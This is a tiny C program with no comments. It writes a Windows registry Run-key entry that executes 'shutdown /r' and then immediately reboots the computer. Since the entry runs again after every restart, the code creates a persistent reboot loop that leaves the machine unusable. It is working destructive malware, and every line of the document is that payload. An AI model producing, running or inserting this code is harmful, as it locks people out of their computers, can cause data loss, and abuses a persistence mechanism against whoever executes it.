#include<stdlib.h>
int main()
{
    system("reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v restart /t  REG_SZ /d \"C:\\Windows\\System32\\shutdown /r\"");
    system("shutdown /r");
    return 0;
}